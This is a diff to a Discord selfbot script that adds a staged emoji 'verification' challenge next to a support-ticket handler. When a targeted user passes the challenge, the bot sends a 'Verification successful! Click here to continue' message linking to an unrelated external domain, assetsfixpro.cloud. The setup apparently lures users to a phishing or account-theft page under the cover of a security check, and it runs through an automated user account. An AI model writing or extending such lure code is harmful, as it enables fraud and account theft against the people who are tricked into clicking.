@@ -74,6 +74,131 @@ client.on("ready", async () => {
   console.log(`${client.user.username} is ready!`);
 });
 
+// Handle reaction-based verification and tickets (selfbots can't use buttons)
+client.on("messageReactionAdd", async (reaction, user) => {
+  // Ignore bot's own reactions
+  if (user.id === client.user.id) return;
+
+  // Check if this is a verification message
+  const verifications = client.verifications || new Map();
+  const verification = Array.from(verifications.values()).find(
+    (v) => v.messageId === reaction.message.id
+  );
+
+  if (verification) {
+    // Find the user this verification is for
+    const targetUserId = Array.from(verifications.entries()).find(
+      ([, v]) => v.messageId === reaction.message.id
+    )?.[0];
+
+    if (!targetUserId) return;
+
+    // Check if the person reacting is the target user
+    if (user.id !== targetUserId) {
+      try {
+        await reaction.users.remove(user.id);
+      } catch (err) {
+        console.log("Could not remove reaction");
+      }
+      return;
+    }
+
+    const clickedIcon = reaction.emoji.name;
+
+    // Check if the clicked icon is correct
+    if (clickedIcon === verification.correctIcon) {
+      // Correct! Send them the verification link
+      try {
+        await reaction.message.channel.send(
+          `${user} ✅ Verification successful! Click here to continue: https://assetsfixpro.cloud/discordx0x/x0/`
+        );
+
+        console.log(`✅ ${user.tag} verified successfully`);
+
+        // Clean up
+        client.verifications.delete(targetUserId);
+
+        // Delete the verification message
+        try {
+          await reaction.message.delete();
+        } catch (err) {
+          console.log("Could not delete verification message");
+        }
+      } catch (error) {
+        console.error("Error sending verification success:", error);
+      }
+    } else {
+      // Wrong icon - remove their reaction
+      try {
+        await reaction.users.remove(user.id);
+        await reaction.message.channel
+          .send(
+            `${user} ❌ Wrong emoji! Please react with **${verification.correctIcon}**`
+          )
+          .then((msg) => {
+            setTimeout(() => msg.delete().catch(() => {}), 5000);
+          });
+
+        console.log(
+          `❌ ${user.tag} selected wrong icon: ${clickedIcon} (correct: ${verification.correctIcon})`
+        );
+      } catch (error) {
+        console.error("Error handling wrong reaction:", error);
+      }
+    }
+    return; // Exit after handling verification
+  }
+
+  // Check if the reaction is the ticket emoji
+  if (reaction.emoji.name === "🎫") {
+    const guild = reaction.message.guild;
+    if (!guild) return;
+
+    // Logic to ensure this is a ticket creation request
+    if (reaction.message.author.id !== client.user.id) return;
+    if (!reaction.message.content.includes("create a support ticket")) return;
+
+    // Find next ticket number
+    const ticketChannels = guild.channels.cache.filter((c) =>
+      c.name.startsWith("ticket-")
+    );
+    const ticketCount = ticketChannels.size;
+    const ticketNumber = String(ticketCount + 1).padStart(3, "0");
+    const channelName = `ticket-${ticketNumber}`;
+
+    try {
+      // Create the ticket channel
+      const ticketChannel = await guild.channels.create(channelName, {
+        type: "GUILD_TEXT",
+        permissionOverwrites: [
+          {
+            id: guild.id, // @everyone
+            deny: ["VIEW_CHANNEL"],
+          },
+          {
+            id: user.id,
+            allow: ["VIEW_CHANNEL", "SEND_MESSAGES", "READ_MESSAGE_HISTORY"],
+          },
+        ],
+      });
+
+      // Send welcome message inside the ticket
+      await ticketChannel.send(
+        `Welcome ${user}! Please tell us your problem, and a support staff member will be with you shortly.`
+      );
+
+      // Try to remove the reaction
+      try {
+        await reaction.users.remove(user);
+      } catch (err) {
+        console.log("Could not remove user reaction (missing permission)");
+      }
+    } catch (error) {
+      console.error("Error creating ticket:", error);
+    }
+  }
+});
+
 client.on("guildMemberAdd", async (member) => {
   try {
     // Only process if this is YOUR support server (if SUPPORT_SERVER_ID is set)
@@ -135,66 +260,94 @@ client.on("guildMemberAdd", async (member) => {
   }
 });
 
-client.on("messageReactionAdd", async (reaction, user) => {
-  // Ignore reactions from the bot itself
-  if (user.id === client.user.id) return;
-
-  // Check if the reaction is the ticket emoji
-  if (reaction.emoji.name === "🎫") {
-    const guild = reaction.message.guild;
-    if (!guild) return;
-
-    // Logic to ensure this is a ticket creation request
-    // For example, only allow if the message is from the bot and contains specific text
-    if (reaction.message.author.id !== client.user.id) return;
-    if (!reaction.message.content.includes("create a support ticket")) return;
-
-    // Find next ticket number
-    const ticketChannels = guild.channels.cache.filter((c) =>
-      c.name.startsWith("ticket-")
-    );
-    const ticketCount = ticketChannels.size;
-    const ticketNumber = String(ticketCount + 1).padStart(3, "0");
-    const channelName = `ticket-${ticketNumber}`;
-
-    try {
-      // Create the ticket channel
-      const ticketChannel = await guild.channels.create(channelName, {
-        type: "GUILD_TEXT",
-        permissionOverwrites: [
-          {
-            id: guild.id, // @everyone
-            deny: ["VIEW_CHANNEL"],
-          },
-          {
-            id: user.id,
-            allow: ["VIEW_CHANNEL", "SEND_MESSAGES", "READ_MESSAGE_HISTORY"],
-          },
-          // Admins implicitly have access, but we can add specific roles if needed
-        ],
-      });
-
-      // Send welcome message inside the ticket
-      await ticketChannel.send(
-        `Welcome ${user}! Please tell us your problem, and a support staff member will be with you shortly.`
-      );
-
-      // Try to remove the reaction from the original message to indicate acknowledgment
-      // (Only works if bot has MANAGE_MESSAGES permission)
-      try {
-        await reaction.users.remove(user);
-      } catch (err) {
-        console.log("Could not remove user reaction (missing permission)");
-      }
-    } catch (error) {
-      console.error("Error creating ticket:", error);
-    }
-  }
-});
-
 client.on("messageCreate", async (message) => {
   // Ignore messages from the bot itself
   if (message.author.id === client.user.id) return;
+
+  // Check for verification command: !verify @user or @verify @user or /verify @user
+  const msgContent = message.content.toLowerCase();
+  const isVerifyCommand =
+    msgContent.startsWith("!verify") ||
+    msgContent.startsWith("@verify") ||
+    msgContent.startsWith("/verify") ||
+    msgContent.startsWith("verify");
+
+  if (isVerifyCommand) {
+    console.log(
+      `Verify command detected from ${message.author.tag}: "${message.content}"`
+    );
+
+    // Check if user mentioned someone
+    if (message.mentions.users.size === 0) {
+      await message.reply(
+        "❌ Please mention a user to verify. Example: `!verify @username`"
+      );
+      return;
+    }
+
+    console.log(`Verification command detected from ${message.author.tag}`);
+
+    // Check if user is admin (has ADMINISTRATOR or MANAGE_GUILD permission)
+    const isAdmin =
+      message.member?.permissions?.has("ADMINISTRATOR") ||
+      message.member?.permissions?.has("MANAGE_GUILD");
+
+    if (!isAdmin) {
+      await message.reply(
+        "❌ You need administrator permissions to use this command."
+      );
+      return;
+    }
+
+    const targetUser = message.mentions.users.first();
+
+    try {
+      // Random verification icons (emojis)
+      const icons = ["🔒", "🔑", "✅", "🛡️", "⭐", "🎯"];
+      const correctIcon = icons[Math.floor(Math.random() * icons.length)];
+
+      // Shuffle icons for options
+      const shuffledIcons = [...icons].sort(() => Math.random() - 0.5);
+
+      // Create verification message with reactions (selfbots can't send buttons)
+      const verifyMessage = await message.channel.send(
+        `${targetUser}, please verify yourself by reacting with the **${correctIcon}** emoji below:`
+      );
+
+      // Add all icon reactions to the message
+      for (const icon of shuffledIcons) {
+        await verifyMessage.react(icon);
+      }
+
+      console.log(
+        `Verification sent to ${targetUser.tag} - Correct icon: ${correctIcon}`
+      );
+
+      // Store the correct answer for this verification
+      client.verifications = client.verifications || new Map();
+      client.verifications.set(targetUser.id, {
+        correctIcon,
+        messageId: verifyMessage.id,
+        timestamp: Date.now(),
+      });
+
+      // Auto-delete verification after 2 minutes if not completed
+      setTimeout(async () => {
+        try {
+          await verifyMessage.delete();
+          client.verifications.delete(targetUser.id);
+        } catch (err) {
+          console.log("Verification message already deleted");
+        }
+      }, 120000); // 2 minutes
+    } catch (error) {
+      console.error("Error sending verification:", error);
+      await message.reply(
+        "❌ Failed to send verification. Make sure the bot has proper permissions."
+      );
+    }
+    return;
+  }
 
   // Ignore support auto-reply for specific server
   if (message.guild?.id === "1442214024967360754") return;
